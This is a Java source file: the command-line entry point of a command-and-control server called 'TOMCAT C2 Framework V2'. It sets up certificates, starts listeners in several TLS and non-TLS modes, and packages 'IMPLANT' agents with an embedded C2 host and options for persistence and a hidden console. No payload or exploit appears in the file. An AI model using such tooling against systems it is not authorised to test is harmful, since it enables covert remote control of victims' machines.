package com.tomcat;

import com.tomcat.core.crypto.CertificateManager;
import com.tomcat.core.output.Logger;
import com.tomcat.core.server.ListenerMode;
import com.tomcat.iface.CLI;
import com.tomcat.iface.GUI;
import com.tomcat.iface.TeamServer;
import com.tomcat.iface.WebApp;
import com.tomcat.iface.banner.AUTHBanner;
import com.tomcat.iface.banner.TBanner;
import com.tomcat.utils.ServerConfig;
import com.tomcat.utils.SystemHelper;
import java.io.*;
import java.nio.file.*;
import java.util.*;

public final class Start {

    private static ServerConfig Config;

    public static void main(String[] Args) {
        Config = new ServerConfig();
        Logger.Configure(
            Config.GetLoggingLevel(),
            Config.IsVerbose(),
            Config.IsFileLoggingEnabled(),
            Config.GetLogFile(),
            Config.GetMaxLogEntries()
        );
        ProcessArgs(Arrays.asList(Args));
    }

    private static void ProcessArgs(List<String> Args) {
        if (Args.contains("-h") || Args.contains("--help")) {
            PrintHelp();
            return;
        }

        if (Args.contains("-i") || Args.contains("--init-certs")) {
            SystemHelper.ClearScreen();
            TBanner.Logo();
            AUTHBanner.Logo();
            InitCertificates(Arg(Args, "-S", "--host", Config.GetServerHost()));
            return;
        }

        String GenAgent = Arg(Args, "-a", "--gen-agent", null);
        if (GenAgent != null) {
            SystemHelper.ClearScreen();
            TBanner.Logo();
            AUTHBanner.Logo();
            GenerateAgent(GenAgent, Args);
            return;
        }

        if (Args.contains("-m") || Args.contains("--gen-multi-agent")) {
            SystemHelper.ClearScreen();
            TBanner.Logo();
            AUTHBanner.Logo();
            GenerateMultiAgent(Args);
            return;
        }

        if (Args.contains("-l") || Args.contains("--list-agents")) {
            SystemHelper.ClearScreen();
            TBanner.Logo();
            AUTHBanner.Logo();
            ListAgents();
            return;
        }

        String Revoke = Arg(Args, "-r", "--revoke-agent", null);
        if (Revoke != null) {
            SystemHelper.ClearScreen();
            TBanner.Logo();
            AUTHBanner.Logo();
            RevokeAgent(Revoke);
            return;
        }

        SystemHelper.ClearScreen();
        TBanner.Logo();
        AUTHBanner.Logo();

        String Host = Arg(Args, "-S", "--host", Config.GetServerHost());
        int Port = parseInt(Arg(Args, "-p", "--port", String.valueOf(Config.GetServerPort())), Config.GetServerPort());

        ListenerMode Mode = ResolveMode(Args);

        if (Mode.RequiresTls() && !Files.exists(Paths.get(Config.GetKeystorePath()))) {
            Logger.Error("Keystore not found: " + Config.GetKeystorePath());
            Logger.Warn("Run: java -jar tomcat-c2.jar --init-certs");
            System.exit(1);
        }

        String Interface = Config.GetInterfaceMode();
        if (Args.contains("-C") || Args.contains("--cli-mode")) Interface = "cli";
        else if (Args.contains("-G") || Args.contains("--gui-mode")) Interface = "gui";
        else if (Args.contains("-W") || Args.contains("--web-mode")) Interface = "web";
        else if (Args.contains("-TS") || Args.contains("--teamserver")) Interface = "teamserver";

        Logger.Info("Mode: " + Mode.name() + " | Interface: " + Interface.toUpperCase());
        StartInterface(Host, Port, Mode, Interface, Args);
    }

    private static ListenerMode ResolveMode(List<String> Args) {
        String FromProp = Config.GetServerMode();
        if (Args.contains("--fmtls")) return ListenerMode.FMTLS;
        if (Args.contains("--mtls") || Args.contains("-T")) return ListenerMode.MTLS;
        if (Args.contains("--tls")) return ListenerMode.TLS;
        if (Args.contains("--https")) return ListenerMode.HTTPS;
        if (Args.contains("--http")) return ListenerMode.HTTP;
        if (Args.contains("--raw") || Args.contains("--plain")) return ListenerMode.RAW;
        if (Args.contains("--multi") || Args.contains("-M")) return ListenerMode.MULTI;
        return ListenerMode.FromString(FromProp);
    }

    private static void StartInterface(String Host, int Port, ListenerMode Mode, String Interface, List<String> Args) {
        try {
            switch (Interface) {
                case "cli" -> new CLI(Config).Run(Host, Port, Mode);
                case "teamserver" -> {
                    int TsPort = parseInt(
                        Arg(Args, "-tp", "--teamserver-port", String.valueOf(Config.GetTeamServerPort())),
                        Config.GetTeamServerPort()
                    );
                    TeamServer Ts = new TeamServer(Config, Mode);
                    Ts.Run(Config.GetWebHost(), TsPort);
                    Thread.currentThread().join();
                }
                case "gui" -> GUI.Launch(Config);
                default -> {
                    WebApp App = new WebApp(Config, Mode);
                    App.Run(Config.GetWebHost(), Config.GetWebPort());
                    Thread.currentThread().join();
                }
            }
        } catch (InterruptedException Ignored) {
            Logger.Warn("Server stopped");
        } catch (Exception E) {
            Logger.Error("Fatal: " + E.getMessage());
            System.exit(1);
        }
    }

    private static void InitCertificates(String Host) {
        try {
            CertificateManager Mgr = new CertificateManager(Config);
            Mgr.Initialize(Host);
            Logger.Success("Certificates stored in: " + Paths.get(Config.GetKeystorePath()).getParent());
            Logger.Info("Next: java -jar tomcat-c2.jar -a <agent-id>");
        } catch (Exception E) {
            Logger.Error("Certificate init failed: " + E.getMessage());
        }
    }

    private static void GenerateAgent(String AgentId, List<String> Args) {
        try {
            AssertCaExists();
            String Host = Arg(Args, "-ah", "--agent-host", Config.GetServerHost());
            int Port = parseInt(
                Arg(Args, "-ap", "--agent-port", String.valueOf(Config.GetServerPort())),
                Config.GetServerPort()
            );
            boolean UseMtls = Args.contains("-am") || Args.contains("--agent-mtls");
            boolean Persist = Args.contains("-ps") || Args.contains("--persistence");
            boolean HideCon = Args.contains("-hc") || Args.contains("--hide-console");
            CertificateManager Mgr = new CertificateManager(Config);
            Mgr.Initialize(Host);
            String CertPath = Mgr.CreateAgentCertificate(AgentId);
            DeployAgent(AgentId, CertPath, Host, Port, UseMtls, Persist, HideCon);
        } catch (Exception E) {
            Logger.Error("Agent generation failed: " + E.getMessage());
        }
    }

    private static void GenerateMultiAgent(List<String> Args) {
        int Count = parseInt(Arg(Args, "-c", "--gen-agent-count", "10"), 10);
        String Prefix = Arg(Args, "-u", "--gen-agent-prefix", "agent");
        Logger.Info("Generating " + Count + " agents — prefix: " + Prefix);
        int Ok = 0;
        for (int I = 1; I <= Count; I++) {
            String Id = String.format("%s-%03d", Prefix, I);
            try {
                GenerateAgent(Id, Args);
                Ok++;
            } catch (Exception E) {
                Logger.Error("Failed " + Id + ": " + E.getMessage());
            }
        }
        Logger.Info("Generated " + Ok + "/" + Count + " agents");
    }

    private static void ListAgents() {
        try {
            CertificateManager Mgr = new CertificateManager(Config);
            Path AgentDir = Paths.get(Config.GetAgentCertDir());
            if (!Files.exists(AgentDir)) {
                Logger.Warn("No agents found — generate with: -a <agent-id>");
                return;
            }
            Files.list(AgentDir)
                .filter(P -> P.toString().endsWith(".p12"))
                .forEach(P -> Logger.Info("Agent: " + P.getFileName()));
        } catch (Exception E) {
            Logger.Error("List agents failed: " + E.getMessage());
        }
    }

    private static void RevokeAgent(String AgentId) {
        try {
            CertificateManager Mgr = new CertificateManager(Config);
            Mgr.RevokeAgentCertificate(AgentId);
        } catch (Exception E) {
            Logger.Error("Revoke failed: " + E.getMessage());
        }
    }

    private static void DeployAgent(
        String Id,
        String CertPath,
        String Host,
        int Port,
        boolean Mtls,
        boolean Persist,
        boolean HideCon
    ) throws IOException {
        String AgentDir = "IMPLANT/" + Id.toUpperCase();
        Files.createDirectories(Paths.get(AgentDir));
        Files.copy(Paths.get(CertPath), Paths.get(AgentDir + "/agent.p12"), StandardCopyOption.REPLACE_EXISTING);
        Files.copy(Paths.get(Config.GetCaPath()), Paths.get(AgentDir + "/ca.p12"), StandardCopyOption.REPLACE_EXISTING);
        try (PrintWriter W = new PrintWriter(AgentDir + "/README.txt")) {
            W.println("TOMCAT C2 Agent — " + Id);
            W.println("Server  : " + Host + ":" + Port);
            W.println("MTLS    : " + (Mtls ? "ENABLED" : "DISABLED"));
            W.println("Persist : " + Persist);
            W.println("Files   : agent.p12  ca.p12");
        }
        Logger.Success("Agent package: " + AgentDir);
    }

    private static void AssertCaExists() {
        if (!Files.exists(Paths.get(Config.GetCaPath()))) {
            Logger.Error("CA not found: " + Config.GetCaPath());
            Logger.Warn("Run: java -jar tomcat-c2.jar --init-certs");
            System.exit(1);
        }
    }

    private static String Arg(List<String> Args, String Short, String Long, String Default) {
        for (int I = 0; I < Args.size() - 1; I++) {
            if (Args.get(I).equals(Short) || Args.get(I).equals(Long)) return Args.get(I + 1);
        }
        return Default;
    }

    private static int parseInt(String S, int Default) {
        try {
            return Integer.parseInt(S.trim());
        } catch (Exception E) {
            return Default;
        }
    }

    private static void PrintHelp() {
        System.out.println(
            """
                TOMCAT C2 Framework V2

                Usage: java -jar tomcat-c2.jar [options]

                General:
                  -h / --help               Show this help
                  -i / --init-certs         Generate CA + server certificate

                Listener Mode (default: server.mode in server.properties):
                  --multi / -M              Accept all non-TLS connections (raw, TOMCAT, HTTP)
                  --http                    HTTP beacon only
                  --https                   HTTPS beacon only (TLS, no client cert)
                  --tls                     TOMCAT agent over TLS (no client cert)
                  --mtls / -T               TOMCAT agent over mTLS (client cert required)
                  --fmtls                   Full mTLS on TCP + HTTPS beacon

                Server:
                  -S / --host <host>        Bind host        (default: server.host in .properties)
                  -p / --port <port>        Bind port        (default: server.port)

                Interface:
                  -C / --cli-mode           CLI
                  -G / --gui-mode           JavaFX GUI
                  -W / --web-mode           Web panel (default)

                Agent Certificates:
                  -a / --gen-agent <id>     Generate single agent cert
                  -m / --gen-multi-agent    Generate multiple agent certs
                    -c / --gen-agent-count  Count  (default: 10)
                    -u / --gen-agent-prefix Prefix (default: agent)
                  -l / --list-agents        List agents
                  -r / --revoke-agent <id>  Revoke agent cert
                  -ah / --agent-host        C2 host embedded in agent
                  -ap / --agent-port        C2 port embedded in agent
                  -am / --agent-mtls        Enable mTLS for agent
                  -ps / --persistence       Enable persistence
                  -hc / --hide-console      Hide console (Windows)

                Examples:
                  java -jar tomcat-c2.jar -C --raw
                  java -jar tomcat-c2.jar -C --multi
                  java -jar tomcat-c2.jar -C --mtls
                  java -jar tomcat-c2.jar -C --fmtls
                  java -jar tomcat-c2.jar -C --tls -p 443
                  java -jar tomcat-c2.jar -i
                  java -jar tomcat-c2.jar -a myagent -ah 10.0.0.1 -ap 4444 -am
            """
        );
    }
}
